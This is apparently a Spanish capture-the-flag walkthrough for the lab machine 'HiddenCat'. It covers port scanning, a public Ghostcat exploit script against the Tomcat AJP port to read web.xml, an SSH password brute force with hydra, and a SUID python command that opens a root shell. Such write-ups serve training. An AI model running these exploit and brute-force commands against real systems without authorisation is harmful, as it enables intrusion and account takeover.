Maquina: HiddenCat

Autor: El Pinguino de Mario

Dificultad: Facil

ping 172.17.0.2 -c 1

sudo nmap -p- --open -sCV --min-rate 5000 -sS -Pn -n 172.17.0.2 -vvv

Encontramos los puertos 22, 8080 y 8009 abiertos

Puerto 8080 Tenemos un Tomcat versión 9.0.30

Al hacer fuzzing con gobuster, descubrimos la ruta /manager

Pero no podemos hacer mucho con esta información

Puerto 8009

Investigando sobre el puerto 8009, encontramos que es vulnerable a un LFI debido a que Tomcat no está actualizado

HackTricks proporciona un script que, al ejecutarlo, revela lo siguiente

python2 48143.py -p 8009 -f WEB-INF/web.xml 172.17.0.2

escubrimos un posible usuario

Procedemos a realizar un ataque de fuerza bruta por SSH con hydra

hydra -l jerry -P /usr/share/wordlists/rockyou.txt.gz ssh://172.17.0.2

Buscando permisos SUID, encontramos tanto perl como python

Nos vamos a tmp
find / -perm -4000 2>/dev/null

Consultamos GTFObins para encontrar una forma de escalar privilegios con python. Ejecutamos el siguiente comando

/usr/bin/python3.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

whoami
